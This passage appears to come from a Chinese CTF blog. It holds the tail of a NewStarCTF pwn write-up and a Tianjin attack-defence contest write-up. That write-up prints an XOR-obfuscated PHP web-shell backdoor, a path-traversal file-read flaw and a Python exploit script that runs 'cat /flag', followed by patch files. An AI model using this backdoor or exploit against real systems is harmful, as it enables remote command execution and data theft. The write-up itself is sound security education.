class="built_in">puts</span>(<span class="string">&quot;3.Giving out leaflets    60$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">if</span> ( hour &lt;= <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You chose McDonald&#x27;s part time job&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;It took you 4hours and earned 20$&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      hour -= <span class="number">4</span>;</span><br><span class="line">      money += <span class="number">20</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( hour &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You need to rest&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You chose MeiTuan takeout&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;It took you 8hours and earned 40$&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      hour -= <span class="number">8</span>;</span><br><span class="line">      money += <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="keyword">if</span> ( hour &gt; <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You chose giving out leaflets&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;It took you 12hours and earned 60$&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        hour -= <span class="number">12</span>;</span><br><span class="line">        money += <span class="number">60</span>;</span><br><span class="line">        <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dont_try()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">dont_try</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( chance )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You shouldn&#x27;t choose this&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please remember, the shop owner doesn&#x27;t like his secret to be found&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To punish your choice, you will lose 50$ and you will never be able to choose it!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    money -= <span class="number">50</span>;</span><br><span class="line">    --chance;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：有符号型负数int转化为无符号int会导致无符号int数值特别大</p><p>因此，先把所有money花光，之后去dont_try()函数减钱，将其变成负数，即可买到shell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为新生赛，还是比较简单的，对初学者比较友好。</p><p>贴一个官方wp：<a href="https://shimo.im/docs/XKq421EBKzFyRzAN/read">NewStarCTF 2023 Week1 官方WriteUp (shimo.im)</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> reverse </tag>
            
            <tag> misc </tag>
            
            <tag> pwn </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天津市大学生信息安全网络攻防大赛</title>
      <link href="/2023/09/19/2023tianjindawd/"/>
      <url>/2023/09/19/2023tianjindawd/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>此次比赛设DAWD攻防赛和应急响应实战场景赛两个赛题类型，两种赛题同时开赛，其中：</p><p>① DAWD攻防赛会提供4个攻防题目环境，2个web题目环境，2个pwn题目环境，比赛开始时全部开放；</p><p>② 应急响应实战场景赛共一个场景，场景赛包含多个题目，根据问题的难度会设置不同的分值，选手可以通过提交不同题目获取相应的分值。</p><h2 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h2><p>队伍名字 NKV</p><p>DAWD攻防赛排名第一</p><img src="/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png" class=""><p>应急响应排名第七</p><img src="/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png" class=""><p>总分第一</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>dawd的shop题目我们审计出了两个漏洞</p><p>第一个是在&#x2F;config&#x2F;config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$_</span>++;</span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;`&quot;</span>^<span class="string">&quot;?&quot;</span>).(<span class="string">&quot;:&quot;</span>^<span class="string">&quot;&#125;&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=(<span class="string">&quot;$&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line"></span><br><span class="line">$&#123;<span class="variable">$__</span>&#125;[!<span class="variable">$_</span>]($&#123;<span class="variable">$___</span>&#125;[<span class="variable">$_</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个明显的后门，相当于<code>$_GET[&#39;0&#39;]($_POST[&#39;1&#39;])</code></p><p>直接<code>system(&#39;cat /flag&#39;)</code>就行</p><p>另一个是在&#x2F;controller&#x2F;index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>( <span class="variable">$time</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>( <span class="variable">$catid</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中末尾处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数file直接作为变量进行<code>file_get_contents</code>，没有对变量进行过滤，导致直接<code>?c=index&amp;a=show_pic&amp;file=/flag</code>就可以拿到flag</p><p>这里直接贴上我的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则不等式匹配flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span> (<span class="built_in">str</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;^flag\&#123;.*\&#125;$&#x27;</span></span><br><span class="line">    result = re.<span class="keyword">match</span>(pattern, <span class="built_in">str</span>).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/config/config.php?0=system&quot;</span></span><br><span class="line">uri=<span class="string">&quot;&quot;</span></span><br><span class="line">target=url+uri</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url2=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a=requests.post(target,data=data)</span><br><span class="line">    <span class="built_in">print</span>(find_flag(a.text))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    a=requests.post(url2)</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">str</span>(a.text)[-<span class="number">43</span>:-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>patch也贴上</p><p>patch.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">python3 patch.py </span><br><span class="line">cp index.class.php /var/www/html/controller/index.class.php</span><br></pre></td></tr></table></figure><p>index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span 